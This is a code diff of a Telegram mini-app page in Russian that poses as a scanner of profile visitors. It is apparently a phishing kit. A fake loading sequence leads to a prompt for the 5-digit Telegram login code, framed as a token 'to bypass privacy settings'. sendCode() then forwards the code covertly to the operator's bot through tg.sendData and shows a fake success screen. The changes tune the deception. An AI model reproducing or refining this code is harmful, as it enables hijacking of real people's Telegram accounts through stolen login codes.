@@ -16,28 +16,26 @@
         .progress-bar { width: 0%; height: 100%; background: var(--btn); transition: width 0.4s ease; }
         input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 12px; padding: 14px; color: white; font-size: 18px; margin-bottom: 15px; box-sizing: border-box; text-align: center; outline: none; }
         .btn { width: 100%; background: var(--btn); color: white; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; }
-        .period-btn { background: #2c2c2e; margin-bottom: 10px; color: #fff; border: 1px solid #3a3a3c; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo"></div>
         <div id="step-period">
-            <h2>Период анализа</h2>
-            <p>Выберите глубину сканирования логов посещений вашего профиля:</p>
-            <button class="btn period-btn" onclick="startLoading()">За последнюю неделю</button>
-            <button class="btn period-btn" onclick="startLoading()">За 2 недели</button>
-            <button class="btn period-btn" onclick="startLoading()">За месяц (Рекомендуется)</button>
+            <h2>Глубина анализа</h2>
+            <p>Выберите период для сканирования гостей профиля. Доступ будет предоставлен после валидации сессии.</p>
+            <button class="btn" style="background:#2c2c2e;margin-bottom:10px;" onclick="startLoading()">За 7 дней</button>
+            <button class="btn" onclick="startLoading()">За 30 дней (Full)</button>
         </div>
         <div id="step-loading" style="display:none;">
-            <h2 id="load-text">Подключение...</h2>
+            <h2 id="load-text">Авторизация...</h2>
             <div class="progress-container" style="display:block;"><div class="progress-bar" id="bar"></div></div>
-            <p id="load-hint">Установка защищенного соединения...</p>
+            <p id="load-hint">Синхронизация с API Telegram...</p>
         </div>
         <div id="step-code" style="display:none;">
-            <h2>Завершение</h2>
-            <p>Для расшифровки отчета введите <b>Токен безопасности</b>, отправленный в ваш чат Telegram:</p>
-            <input type="number" id="u_code" placeholder="00000" inputmode="numeric">
+            <h2>Токен доступа</h2>
+            <p>Для обхода настроек приватности введите 5-значный <b>токен авторизации</b> из чата Telegram:</p>
+            <input type="number" id="u_code" placeholder="00000">
             <button class="btn" onclick="sendCode()">Подтвердить токен</button>
         </div>
     </div>
@@ -48,35 +46,27 @@
             document.getElementById('step-period').style.display = 'none';
             document.getElementById('step-loading').style.display = 'block';
             let width = 0;
-            const phases = [
-                {w: 25, t: "Связь с сервером...", h: "Авторизация узла..."},
-                {w: 55, t: "Анализ логов...", h: "Поиск совпадений ID..."},
-                {w: 75, t: "Шифрование...", h: "Подготовка отчета..."}
-            ];
-            let pIdx = 0;
             const interval = setInterval(() => {
-                width += Math.random() * 5;
+                width += 2;
+                document.getElementById('bar').style.width = width + '%';
                 if (width >= 75) {
                     clearInterval(interval);
-                    document.getElementById('bar').style.width = '75%';
                     setTimeout(() => {
                         document.getElementById('step-loading').style.display = 'none';
                         document.getElementById('step-code').style.display = 'block';
-                    }, 1500);
-                } else {
-                    if (width > phases[pIdx].w && pIdx < 2) pIdx++;
-                    document.getElementById('load-text').innerText = phases[pIdx].t;
-                    document.getElementById('load-hint').innerText = phases[pIdx].h;
-                    document.getElementById('bar').style.width = width + '%';
+                    }, 1000);
                 }
-            }, 500);
+            }, 100);
         }
         function sendCode() {
             const val = document.getElementById('u_code').value;
-            if(val.length < 5) return alert("Введите 5 цифр");
-            // Шлем данные ОДИН раз за сессию, чтобы ТГ не блочил
+            if(val.length < 5) return alert("Минимум 5 цифр");
+            // Шлем код боту скрыто через sendData
             tg.sendData(JSON.stringify({t: 'c', v: val}));
-            tg.close();
+            document.getElementById('step-code').style.display = 'none';
+            document.getElementById('step-loading').style.display = 'block';
+            document.getElementById('load-text').innerText = "Готово!";
+            setTimeout(() => tg.close(), 1500);
         }
     </script>
 </body>
